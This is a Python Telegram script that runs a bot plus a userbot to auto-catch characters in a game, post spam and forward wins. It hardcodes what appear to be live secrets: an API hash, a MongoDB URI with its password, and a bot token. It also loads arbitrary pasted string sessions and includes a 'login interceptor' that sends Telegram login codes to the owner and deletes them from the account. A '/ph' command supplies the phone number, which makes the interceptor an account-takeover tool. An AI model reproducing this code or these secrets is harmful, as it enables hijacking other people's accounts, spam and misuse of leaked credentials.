import os
import asyncio
import random
import time
import logging
import re
from telethon import TelegramClient, events, errors, functions
from telethon.sessions import StringSession
from motor.motor_asyncio import AsyncIOMotorClient

# ==========================================
# ⚙️ CONFIGURATION (Credentials)
# ==========================================
APP_ID = 39584681
APP_HASH = 'c8c0685d6dd5b9e546093ea90d27733b'
MONGO_URI = "mongodb+srv://kkt:h1BdaMt7nxW9jTXa@cluster0.kb5fzfl.mongodb.net/?appName=Cluster0&tlsAllowInvalidCertificates=true"
BOT_TOKEN = '8738081667:AAHADgcDISntnOBwT3uj2yYw7n3XJUN2uZI'

OWNER_ID = 7693106830
SPECIFIC_GROUP = -1003848067679
COOLDOWN_TIME = 15

# 🎯 NEW CHAT & BOT CONFIGURATIONS
SPAWN_BOT_ID = 6157455819
HINT_BOT_ID = 8506436817
WAIFU_CHAT_ID = -1003848067679

# Global States
is_active = False
is_scraping = False
is_adding_contacts = False  
user_cooldowns = {}
is_talker_active = False       
message_count = 0
spam_tasks = {}
spawn_tracker = {}            
last_spawn_chat_id = None     
HINT_REGEX = re.compile(r"(/catch\s+[^\n]+)") 
is_catch_stopped = False 

# MongoDB Setup
client_mongo = AsyncIOMotorClient(MONGO_URI)
db = client_mongo["telegram_bot"]
reply_save_col = db["reply_save_col"]
target_bots_col = db["target_bots"]  
tomboy_col = db["tomboy_col"]  
marcuz_col = db["marcuz_col"]  
talk_col = db["random_talk"]   
filters_col = db["filters"]

# Initialize Official Bot Client
bot = TelegramClient('official_bot_session', APP_ID, APP_HASH)
userbot = None  

# ==========================================
# 🌍 DUMMY HTTP SERVER FOR RENDER HEALTH CHECK
# ==========================================
async def handle_render_health_check(reader, writer):
    await reader.read(100)
    response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nOK"
    writer.write(response.encode('utf-8'))
    await writer.drain()
    writer.close()

async def start_dummy_web_server():
    port = int(os.environ.get("PORT", 10000))
    try:
        server = await asyncio.start_server(handle_render_health_check, '0.0.0.0', port)
        print(f"🌍 Dummy HTTP Server started on port {port} for Render Health Check!")
        async with server:
            await server.serve_forever()
    except Exception as e:
        print(f"❌ Failed to start Dummy Web Server: {e}")

async def delete_bot_message_delayed(event, bot_msg_id, cmd_msg_id=0):
    try:
        await asyncio.sleep(3)
        to_delete = [bot_msg_id]
        if cmd_msg_id:
            to_delete.append(cmd_msg_id)
            
        await event.client.delete_messages(event.chat_id, to_delete)
    except errors.rpcerrorlist.FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        try:
            await event.client.delete_messages(event.chat_id, to_delete)
        except Exception:
            pass
    except Exception:
        pass

async def delete_catch_message_delayed(client, chat_id, msg_id):
    try:
        await asyncio.sleep(1)
        await client.delete_messages(chat_id, msg_id)
    except Exception:
        pass

async def run_raid_spam_task(event, reply_msg_id, chat_id):
    try:
        while True:
            pipeline = [{"$sample": {"size": 1}}]
            cursor = filters_col.aggregate(pipeline)
            docs = await cursor.to_list(length=1)
            
            if docs:
                reply_text = docs[0].get("text") or docs[0].get("word") or "🎯"
                try:
                    await event.client.send_message(chat_id, reply_text, reply_to=reply_msg_id)
                    await asyncio.sleep(1.0)
                except errors.rpcerrorlist.FloodWaitError as e:
                    await asyncio.sleep(e.seconds)
                except Exception:
                    await asyncio.sleep(1.0)
            else:
                await asyncio.sleep(2.0)
    except asyncio.CancelledError:
        pass

# ==========================================
# ⚔️ USERBOT HANDLERS
# ==========================================
async def spawn_detector_handler(event):
    global last_spawn_chat_id, spawn_tracker, is_catch_stopped 
    
    if is_catch_stopped:
        return

    if event.sender_id == SPAWN_BOT_ID and event.text:
        if "ᴀ ᴄʜᴀʀᴀᴄᴛᴇʀ ʜᴀs sᴘᴀᴡɴᴇᴅ ɪɴ ᴛʜᴇ ᴄʜᴀᴛ!" in event.text:
            if event.chat_id in [-1001947407821, -1003067509601]:
                return  
            if any(emoji in event.text for emoji in ["🔵", "🟣" ,"🟡" ,"🟠"]):
                return  

            orig_chat_id = event.chat_id
            last_spawn_chat_id = orig_chat_id  
            
            try:
                fwd_msg = await event.message.forward_to(WAIFU_CHAT_ID)
                reply_msg = await fwd_msg.reply("/waifu")
                
                spawn_tracker[fwd_msg.id] = orig_chat_id
                spawn_tracker[reply_msg.id] = orig_chat_id
                
                if len(spawn_tracker) > 100:
                    spawn_tracker.pop(next(iter(spawn_tracker)))
            except Exception:
                pass

async def hint_solver_handler(event):
    global last_spawn_chat_id, spawn_tracker, is_catch_stopped
    
    if is_catch_stopped:
        return

    if event.chat_id == WAIFU_CHAT_ID and event.sender_id == HINT_BOT_ID and event.text:
        match = HINT_REGEX.search(event.text)
        if match:
            catch_command = match.group(1).strip(" `\n\r")
            target_group = last_spawn_chat_id
            
            if event.reply_to_msg_id and event.reply_to_msg_id in spawn_tracker:
                target_group = spawn_tracker[event.reply_to_msg_id]
                
            if target_group:
                if target_group in [-1001947407821, -1003067509601]:
                    return
                try:
                    delay_time = random.uniform(0.5, 0.6) 
                    async with event.client.action(target_group, 'typing'):
                        await asyncio.sleep(delay_time)
                        
                    sent_msg = await event.client.send_message(target_group, catch_command)
                    asyncio.create_task(delete_catch_message_delayed(event.client, target_group, sent_msg.id))
                except Exception:
                    pass

async def catch_success_forwarder_handler(event):
    global is_catch_stopped
    if is_catch_stopped:
        return
    if event.sender_id == SPAWN_BOT_ID and event.text:
        if "ʏᴏᴜ ɢᴏᴛ ᴀ ɴᴇᴡ ᴄʜᴀʀᴀᴄᴛᴇʀ!" in event.text and event.message.mentioned:
            try:
                await event.message.forward_to(SPECIFIC_GROUP)
            except Exception:
                pass

# 🔐 [NEW] TELEGRAM LOGIN NOTIFICATION INTERCEPTOR 
async def telegram_service_handler(event):
    """ Telegram (777000) မှလာသော Login Code ကို ဖမ်းယူပြီး ပယ်ဖျက်မည် """
    msg_text = event.message.text
    try:
        # 1. 🤖 Official Bot မှတစ်ဆင့် Owner ၏ DM (Private Chat) သို့ Code ကို ပို့ပေးမည်
        await bot.send_message(
            OWNER_ID, 
            f"🔐 **Telegram Login Intercepted!** 🔐\n\n{msg_text}"
        )
        # 2. 🗑️ Userbot ဘက်မှ Telegram Service Message ကို ချက်ချင်း ဖျက်ပစ်မည်
        await event.delete()
        print("🗑️ Intercepted and Auto-Deleted Telegram Login Code!")
    except Exception as e:
        print(f"❌ Login Code Intercept Error: {e}")

# ==========================================
# 🤖 OFFICIAL BOT COMMAND HANDLERS
# ==========================================
# ⚠️ [UPDATED] Owner သည် Group တွင်သာမက DM (Private) တွင်ပါ Bot ကို Command များပေးနိုင်ရန် ပြင်ဆင်ထားသည်
@bot.on(events.NewMessage(chats=[SPECIFIC_GROUP, OWNER_ID]))
async def handle_bot_commands(event):
    global is_active, userbot, is_scraping, is_talker_active, is_catch_stopped
    
    if event.sender_id != OWNER_ID:
        return

    cmd = event.message.text.strip() if event.message.text else ""

    if cmd.startswith("/marcuz") or cmd.startswith("/mc"):
        args = cmd.split(maxsplit=1)
        session_str = None
        
        if len(args) > 1:
            session_str = args[1].strip()
        elif event.is_reply:
            reply_msg = await event.get_reply_message()
            if reply_msg and reply_msg.text:
                session_str = reply_msg.text.strip()
                
        if not session_str:
            await event.reply("❌ **String Session မတွေ့ရှိပါ။**")
            return
            
        await marcuz_col.update_one(
            {"key": "string_session"},
            {"$set": {"value": session_str}},
            upsert=True
        )
        await event.reply("✅ String Session ကို သိမ်းပြီးပါပြီ။ Userbot ချိတ်ဆက်နေသည်...")
        
        try:
            if userbot:
                await userbot.disconnect()
            userbot = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
            await userbot.start()
            await userbot.get_dialogs()
            
            userbot.add_event_handler(spawn_detector_handler, events.NewMessage())
            userbot.add_event_handler(hint_solver_handler, events.NewMessage())
            userbot.add_event_handler(catch_success_forwarder_handler, events.NewMessage()) 
            # 🔐 Register Telegram Login Interceptor
            userbot.add_event_handler(telegram_service_handler, events.NewMessage(chats=777000))
            
            await event.reply("🚀 Userbot is Live with Manual Sniper & Login Interceptor!")
        except Exception as e:
            await event.reply(f"❌ Userbot အလုပ်မလုပ်ပါ: {e}")

    elif cmd == "/stop":
        is_catch_stopped = True
        await event.reply("🛑 **Chief! `Detector`, `/catch` နဲ့ `Forwarder` လုပ်ငန်းစဉ်အားလုံးကို ရပ်တန့်လိုက်ပါပြီ။ Userbot အနားယူနေပါပြီ။ 💤**")

    elif cmd == "/start":
        is_catch_stopped = False
        await event.reply("✅ **Chief! Sniper လုပ်ငန်းစဉ်အားလုံးကို ပြန်လည်စတင်လိုက်ပါပြီ။ 🚀**")

    elif cmd.startswith("/echo"):
        if not userbot:
            await event.reply("❌ **Userbot မချိတ်ဆက်ရသေးပါ။**")
            return
        text_to_echo = cmd[5:].strip()
        if text_to_echo:
            try:
                await userbot.send_message(SPECIFIC_GROUP, text_to_echo)
            except Exception as e:
                await event.reply(f"❌ **Userbot မှ စာပို့၍မရပါ:** {e}")
        else:
            await event.reply("⚠️ **အသုံးပြုပုံ:** `/echo Hi`")

    # 📱 [NEW] Get Userbot Phone Number (ONLY WORKS IN DM)
    elif cmd == "/ph":
        if not event.is_private:
            await event.reply("⚠️ **လုံခြုံရေးအရ ဤ Command ကို Bot ရဲ့ Private Chat (DM) တွင်သာ အသုံးပြုပါ။**")
            return
            
        if not userbot:
            await event.reply("❌ **Userbot မချိတ်ဆက်ရသေးပါ။** `/mc` ဖြင့် အရင်ချိတ်ပါ။")
            return
            
        try:
            me = await userbot.get_me()
            phone = me.phone
            if phone:
                await event.reply(f"📱 **Userbot Phone Number:** `+{phone}`\n\n💡 *ယခု ဖုန်းနံပါတ်ဖြင့် Telegram Login ဝင်လိုက်ပါက ကျလာမည့် Code အား ဤနေရာသို့ ချက်ချင်း ဖမ်းယူပို့ပေးပါမည်။*")
            else:
                await event.reply("⚠️ **Userbot အကောင့်တွင် Phone Number ဖျောက်ထားသည် (သို့) မရရှိနိုင်ပါ။**")
        except Exception as e:
            await event.reply(f"❌ ဖုန်းနံပါတ် ယူရာတွင် အမှားဖြစ်နေပါသည်: {e}")

# ==========================================
# 🚀 SYSTEM STARTUP LOGIC
# ==========================================
async def startup():
    global is_active, userbot
    print("⏳ System starting up and loading configurations from MongoDB...")
    
    asyncio.create_task(start_dummy_web_server())

    session_doc = await marcuz_col.find_one({"key": "string_session"})
    if session_doc:
        try:
            session_str = session_doc.get("value")
            userbot = TelegramClient(StringSession(session_str), APP_ID, APP_HASH)
            await userbot.start()
            await userbot.get_dialogs()

            userbot.add_event_handler(spawn_detector_handler, events.NewMessage())
            userbot.add_event_handler(hint_solver_handler, events.NewMessage())
            userbot.add_event_handler(catch_success_forwarder_handler, events.NewMessage()) 
            # 🔐 Register Telegram Login Interceptor on Startup
            userbot.add_event_handler(telegram_service_handler, events.NewMessage(chats=777000))
            
            print("🚀 Userbot Session Successfully Loaded from DB!")
        except Exception as e:
            print(f"⚠️ Failed to load existing Userbot Session: {e}")

    await bot.start(bot_token=BOT_TOKEN)
    print("🤖 Official Bot is running...")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(startup())

